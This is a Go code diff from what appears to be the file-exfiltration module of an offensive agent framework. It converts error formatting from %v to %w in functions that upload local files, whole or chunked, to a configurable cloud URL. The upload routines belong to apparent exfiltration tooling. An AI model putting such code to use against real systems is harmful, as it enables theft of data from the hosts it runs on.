@@ -144,13 +144,13 @@ type httpsExfilResult struct {
 func singleUpload(task structs.Task, client *http.Client, cloud cloudExfilParams, path string, size int64) (int64, error) {
 	file, err := os.Open(path)
 	if err != nil {
-		return 0, fmt.Errorf("cannot open file: %v", err)
+		return 0, fmt.Errorf("cannot open file: %w", err)
 	}
 	defer file.Close()
 
 	req, err := http.NewRequest(cloud.Method, cloud.URL, file)
 	if err != nil {
-		return 0, fmt.Errorf("cannot create request: %v", err)
+		return 0, fmt.Errorf("cannot create request: %w", err)
 	}
 	req.ContentLength = size
 
@@ -166,7 +166,7 @@ func singleUpload(task structs.Task, client *http.Client, cloud cloudExfilParams
 
 	resp, err := client.Do(req)
 	if err != nil {
-		return 0, fmt.Errorf("upload failed: %v", err)
+		return 0, fmt.Errorf("upload failed: %w", err)
 	}
 	defer resp.Body.Close()
 	io.Copy(io.Discard, resp.Body) // drain body
@@ -181,7 +181,7 @@ func singleUpload(task structs.Task, client *http.Client, cloud cloudExfilParams
 func chunkedUpload(task structs.Task, client *http.Client, cloud cloudExfilParams, path string, size int64) (int64, int, error) {
 	file, err := os.Open(path)
 	if err != nil {
-		return 0, 0, fmt.Errorf("cannot open file: %v", err)
+		return 0, 0, fmt.Errorf("cannot open file: %w", err)
 	}
 	defer file.Close()
 
@@ -211,7 +211,7 @@ func chunkedUpload(task structs.Task, client *http.Client, cloud cloudExfilParam
 
 		req, err := http.NewRequest(cloud.Method, chunkURL, bytes.NewReader(buf[:n]))
 		if err != nil {
-			return totalUploaded, chunkNum, fmt.Errorf("chunk %d request error: %v", chunkNum, err)
+			return totalUploaded, chunkNum, fmt.Errorf("chunk %d request error: %w", chunkNum, err)
 		}
 		req.ContentLength = int64(n)
 
@@ -226,7 +226,7 @@ func chunkedUpload(task structs.Task, client *http.Client, cloud cloudExfilParam
 
 		resp, err := client.Do(req)
 		if err != nil {
-			return totalUploaded, chunkNum, fmt.Errorf("chunk %d upload failed: %v", chunkNum, err)
+			return totalUploaded, chunkNum, fmt.Errorf("chunk %d upload failed: %w", chunkNum, err)
 		}
 		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
